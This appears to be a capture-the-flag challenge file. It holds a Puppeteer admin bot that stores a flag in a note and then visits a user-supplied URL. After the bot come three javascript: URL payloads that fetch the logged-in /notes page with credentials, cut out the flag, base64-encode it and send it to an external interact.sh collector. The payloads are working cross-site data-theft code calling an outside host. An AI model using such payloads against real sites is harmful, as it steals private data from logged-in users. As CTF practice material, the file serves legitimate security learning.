const crypto = require('crypto');
const puppeteer = require('puppeteer');

async function run(url) {
	let browser;

	try {
		module.exports.open = true;
		browser = await puppeteer.launch({
			headless: true,
			pipe: true,
            dumpio: true,
			args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
			slowMo: 10
		});

		let page = (await browser.pages())[0] // what really happens here

		await page.goto('http://0.0.0.0:8080/register');
		await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
		await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('http://0.0.0.0:8080/new');
		await page.type('[name="title"]', 'flag');
		await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('about:blank')
		await page.goto(url);
		await page.waitForTimeout(7500);

		await browser.close();
	} catch(e) {
		console.error(e);
		try { await browser.close() } catch(e) {}
	}

	module.exports.open = false;
}

module.exports = { open: false, run }

javascript:fetch("http://172.17.0.2:8080/notes").then(response => response.text().then(text=>fetch("https://c8t12582vtc00001cfz0grp8uyoyyyyyn.interact.sh/"+btoa(text.slice(532,532+11)),{"mode":"no-cors","credentials":"include"})))

javascript:fetch("http://localhost:8080/notes", {"mode":"no-cors","credentials":"include"}).then(response => response.text().then(text=>fetch("https://c8t12582vtc00001cfz0grp8uyoyyyyyn.interact.sh/"+btoa(text.toString().slice(0,11)),{"mode":"no-cors","credentials":"include"})))

javascript:fetch("http://localhost:8080/notes").then(response => response.text().then(text=>fetch("https://c8t12582vtc00001cfz0grp8uyoyyyyyn.interact.sh/"+btoa(text.slice(532,532+11)),{"mode":"no-cors","credentials":"include"})))